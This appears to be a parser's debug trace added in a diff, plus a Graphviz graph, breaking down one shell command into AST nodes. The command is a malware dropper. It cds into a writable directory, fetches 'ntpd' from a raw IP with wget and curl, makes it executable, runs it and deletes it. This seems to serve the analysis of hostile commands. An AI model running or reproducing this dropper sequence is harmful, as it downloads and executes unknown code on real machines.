@@ -1,0 +1,266 @@
+Count: 1 Line:  ListNode(lineno=2, pos=(12, 172), parts=[
+  NodeName:  ListNode  Space:  0
+[New Node]Label:     Level:  0.0  Kind:  ListNode
+Level Vs:  -1  :  0.0
+Count: 2 Line:    CommandNode(lineno=2, pos=(12, 19), parts=[
+  NodeName:  CommandNode  Space:  2
+[New Node]Label:     Level:  1.0  Kind:  CommandNode
+Level Vs:  0.0  :  1.0
+Count: 3 Line:      WordNode(lineno=2, pos=(12, 14), word='cd'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  cd   Level:  2.0  Kind:  WordNode
+Level Vs:  1.0  :  2.0
+Count: 4 Line:      WordNode(lineno=2, pos=(15, 19), word='/tmp'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  /tmp   Level:  2.0  Kind:  WordNode
+Level Vs:  2.0  :  2.0
+Element Length:  4
+Last Node:  WordNode  Level: 2.0
+Count: 5 Line:    OperatorNode(lineno=2, op='||', pos=(20, 22)),
+  NodeName:  OperatorNode  Space:  2
+[New Node]Label:  ||   Level:  1.0  Kind:  OperatorNode
+Level Vs:  2.0  :  1.0
+Element Length:  4
+Last Node:  WordNode  Level: 2.0
+Element Length:  3
+Last Node:  CommandNode  Level: 1.0
+Count: 6 Line:    CommandNode(lineno=2, pos=(23, 34), parts=[
+  NodeName:  CommandNode  Space:  2
+[New Node]Label:     Level:  1.0  Kind:  CommandNode
+Level Vs:  1.0  :  1.0
+Element Length:  3
+Last Node:  OperatorNode  Level: 1.0
+Count: 7 Line:      WordNode(lineno=2, pos=(23, 25), word='cd'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  cd   Level:  2.0  Kind:  WordNode
+Level Vs:  1.0  :  2.0
+Count: 8 Line:      WordNode(lineno=2, pos=(26, 34), word='/var/run'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  /var/run   Level:  2.0  Kind:  WordNode
+Level Vs:  2.0  :  2.0
+Element Length:  4
+Last Node:  WordNode  Level: 2.0
+Count: 9 Line:    OperatorNode(lineno=2, op='||', pos=(35, 37)),
+  NodeName:  OperatorNode  Space:  2
+[New Node]Label:  ||   Level:  1.0  Kind:  OperatorNode
+Level Vs:  2.0  :  1.0
+Element Length:  4
+Last Node:  WordNode  Level: 2.0
+Element Length:  3
+Last Node:  CommandNode  Level: 1.0
+Count: 10 Line:    CommandNode(lineno=2, pos=(38, 45), parts=[
+  NodeName:  CommandNode  Space:  2
+[New Node]Label:     Level:  1.0  Kind:  CommandNode
+Level Vs:  1.0  :  1.0
+Element Length:  3
+Last Node:  OperatorNode  Level: 1.0
+Count: 11 Line:      WordNode(lineno=2, pos=(38, 40), word='cd'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  cd   Level:  2.0  Kind:  WordNode
+Level Vs:  1.0  :  2.0
+Count: 12 Line:      WordNode(lineno=2, pos=(41, 45), word='/mnt'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  /mnt   Level:  2.0  Kind:  WordNode
+Level Vs:  2.0  :  2.0
+Element Length:  4
+Last Node:  WordNode  Level: 2.0
+Count: 13 Line:    OperatorNode(lineno=2, op='||', pos=(46, 48)),
+  NodeName:  OperatorNode  Space:  2
+[New Node]Label:  ||   Level:  1.0  Kind:  OperatorNode
+Level Vs:  2.0  :  1.0
+Element Length:  4
+Last Node:  WordNode  Level: 2.0
+Element Length:  3
+Last Node:  CommandNode  Level: 1.0
+Count: 14 Line:    CommandNode(lineno=2, pos=(49, 57), parts=[
+  NodeName:  CommandNode  Space:  2
+[New Node]Label:     Level:  1.0  Kind:  CommandNode
+Level Vs:  1.0  :  1.0
+Element Length:  3
+Last Node:  OperatorNode  Level: 1.0
+Count: 15 Line:      WordNode(lineno=2, pos=(49, 51), word='cd'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  cd   Level:  2.0  Kind:  WordNode
+Level Vs:  1.0  :  2.0
+Count: 16 Line:      WordNode(lineno=2, pos=(52, 57), word='/root'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  /root   Level:  2.0  Kind:  WordNode
+Level Vs:  2.0  :  2.0
+Element Length:  4
+Last Node:  WordNode  Level: 2.0
+Count: 17 Line:    OperatorNode(lineno=2, op='||', pos=(58, 60)),
+  NodeName:  OperatorNode  Space:  2
+[New Node]Label:  ||   Level:  1.0  Kind:  OperatorNode
+Level Vs:  2.0  :  1.0
+Element Length:  4
+Last Node:  WordNode  Level: 2.0
+Element Length:  3
+Last Node:  CommandNode  Level: 1.0
+Count: 18 Line:    CommandNode(lineno=2, pos=(61, 65), parts=[
+  NodeName:  CommandNode  Space:  2
+[New Node]Label:     Level:  1.0  Kind:  CommandNode
+Level Vs:  1.0  :  1.0
+Element Length:  3
+Last Node:  OperatorNode  Level: 1.0
+Count: 19 Line:      WordNode(lineno=2, pos=(61, 63), word='cd'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  cd   Level:  2.0  Kind:  WordNode
+Level Vs:  1.0  :  2.0
+Count: 20 Line:      WordNode(lineno=2, pos=(64, 65), word='/'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  /   Level:  2.0  Kind:  WordNode
+Level Vs:  2.0  :  2.0
+Element Length:  4
+Last Node:  WordNode  Level: 2.0
+Count: 21 Line:    OperatorNode(lineno=2, op=';', pos=(65, 66)),
+  NodeName:  OperatorNode  Space:  2
+[New Node]Label:  ;   Level:  1.0  Kind:  OperatorNode
+Level Vs:  2.0  :  1.0
+Element Length:  4
+Last Node:  WordNode  Level: 2.0
+Element Length:  3
+Last Node:  CommandNode  Level: 1.0
+Count: 22 Line:    CommandNode(lineno=2, pos=(67, 99), parts=[
+  NodeName:  CommandNode  Space:  2
+[New Node]Label:     Level:  1.0  Kind:  CommandNode
+Level Vs:  1.0  :  1.0
+Element Length:  3
+Last Node:  OperatorNode  Level: 1.0
+Count: 23 Line:      WordNode(lineno=2, pos=(67, 71), word='wget'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  wget   Level:  2.0  Kind:  WordNode
+Level Vs:  1.0  :  2.0
+Count: 24 Line:      WordNode(lineno=2, pos=(72, 99), word='http://165.227.106.171/ntpd'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  http://165.227.106.171/ntpd   Level:  2.0  Kind:  WordNode
+Level Vs:  2.0  :  2.0
+Element Length:  4
+Last Node:  WordNode  Level: 2.0
+Count: 25 Line:    OperatorNode(lineno=2, op=';', pos=(99, 100)),
+  NodeName:  OperatorNode  Space:  2
+[New Node]Label:  ;   Level:  1.0  Kind:  OperatorNode
+Level Vs:  2.0  :  1.0
+Element Length:  4
+Last Node:  WordNode  Level: 2.0
+Element Length:  3
+Last Node:  CommandNode  Level: 1.0
+Count: 26 Line:    CommandNode(lineno=2, pos=(101, 136), parts=[
+  NodeName:  CommandNode  Space:  2
+[New Node]Label:     Level:  1.0  Kind:  CommandNode
+Level Vs:  1.0  :  1.0
+Element Length:  3
+Last Node:  OperatorNode  Level: 1.0
+Count: 27 Line:      WordNode(lineno=2, pos=(101, 105), word='curl'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  curl   Level:  2.0  Kind:  WordNode
+Level Vs:  1.0  :  2.0
+Count: 28 Line:      WordNode(lineno=2, pos=(106, 108), word='-O'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  -O   Level:  2.0  Kind:  WordNode
+Level Vs:  2.0  :  2.0
+Element Length:  4
+Last Node:  WordNode  Level: 2.0
+Count: 29 Line:      WordNode(lineno=2, pos=(109, 136), word='http://165.227.106.171/ntpd'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  http://165.227.106.171/ntpd   Level:  2.0  Kind:  WordNode
+Level Vs:  2.0  :  2.0
+Element Length:  4
+Last Node:  WordNode  Level: 2.0
+Count: 30 Line:    OperatorNode(lineno=2, op=';', pos=(136, 137)),
+  NodeName:  OperatorNode  Space:  2
+[New Node]Label:  ;   Level:  1.0  Kind:  OperatorNode
+Level Vs:  2.0  :  1.0
+Element Length:  4
+Last Node:  WordNode  Level: 2.0
+Element Length:  3
+Last Node:  CommandNode  Level: 1.0
+Count: 31 Line:    CommandNode(lineno=2, pos=(138, 151), parts=[
+  NodeName:  CommandNode  Space:  2
+[New Node]Label:     Level:  1.0  Kind:  CommandNode
+Level Vs:  1.0  :  1.0
+Element Length:  3
+Last Node:  OperatorNode  Level: 1.0
+Count: 32 Line:      WordNode(lineno=2, pos=(138, 143), word='chmod'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  chmod   Level:  2.0  Kind:  WordNode
+Level Vs:  1.0  :  2.0
+Count: 33 Line:      WordNode(lineno=2, pos=(144, 146), word='+x'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  +x   Level:  2.0  Kind:  WordNode
+Level Vs:  2.0  :  2.0
+Element Length:  4
+Last Node:  WordNode  Level: 2.0
+Count: 34 Line:      WordNode(lineno=2, pos=(147, 151), word='ntpd'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  ntpd   Level:  2.0  Kind:  WordNode
+Level Vs:  2.0  :  2.0
+Element Length:  4
+Last Node:  WordNode  Level: 2.0
+Count: 35 Line:    OperatorNode(lineno=2, op=';', pos=(151, 152)),
+  NodeName:  OperatorNode  Space:  2
+[New Node]Label:  ;   Level:  1.0  Kind:  OperatorNode
+Level Vs:  2.0  :  1.0
+Element Length:  4
+Last Node:  WordNode  Level: 2.0
+Element Length:  3
+Last Node:  CommandNode  Level: 1.0
+Count: 36 Line:    CommandNode(lineno=2, pos=(153, 159), parts=[
+  NodeName:  CommandNode  Space:  2
+[New Node]Label:     Level:  1.0  Kind:  CommandNode
+Level Vs:  1.0  :  1.0
+Element Length:  3
+Last Node:  OperatorNode  Level: 1.0
+Count: 37 Line:      WordNode(lineno=2, pos=(153, 159), word='./ntpd'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  ./ntpd   Level:  2.0  Kind:  WordNode
+Level Vs:  1.0  :  2.0
+Count: 38 Line:    OperatorNode(lineno=2, op=';', pos=(159, 160)),
+  NodeName:  OperatorNode  Space:  2
+[New Node]Label:  ;   Level:  1.0  Kind:  OperatorNode
+Level Vs:  2.0  :  1.0
+Element Length:  4
+Last Node:  WordNode  Level: 2.0
+Element Length:  3
+Last Node:  CommandNode  Level: 1.0
+Count: 39 Line:    CommandNode(lineno=2, pos=(161, 172), parts=[
+  NodeName:  CommandNode  Space:  2
+[New Node]Label:     Level:  1.0  Kind:  CommandNode
+Level Vs:  1.0  :  1.0
+Element Length:  3
+Last Node:  OperatorNode  Level: 1.0
+Count: 40 Line:      WordNode(lineno=2, pos=(161, 163), word='rm'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  rm   Level:  2.0  Kind:  WordNode
+Level Vs:  1.0  :  2.0
+Count: 41 Line:      WordNode(lineno=2, pos=(164, 167), word='-rf'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  -rf   Level:  2.0  Kind:  WordNode
+Level Vs:  2.0  :  2.0
+Element Length:  4
+Last Node:  WordNode  Level: 2.0
+Count: 42 Line:      WordNode(lineno=2, pos=(168, 172), word='ntpd'),
+  NodeName:  WordNode  Space:  4
+[New Node]Label:  ntpd   Level:  2.0  Kind:  WordNode
+Level Vs:  2.0  :  2.0
+Element Length:  4
+Last Node:  WordNode  Level: 2.0
+digraph {
+0 [label="cd /tmp "];
+0 -> 0
+2 [label="cd /var/run "];
+2 -> 4 [label="||,"];
+4 [label="cd /mnt "];
+4 -> 6 [label="||,"];
+6 [label="cd /root "];
+6 -> 8 [label="||,"];
+8 [label="cd / "];
+8 -> 10 [label="||,"];
+10 [label="wget http://165.227.106.171/ntpd "];
+10 -> 12 [label=";,"];
+12 [label="curl -O http://165.227.106.171/ntpd "];
+12 -> 14 [label=";,"];
+14 [label="chmod +x ntpd "];
+14 -> 16 [label=";,"];
+16 [label="./ntpd "];
+16 -> 17 [label=";,"];
+}
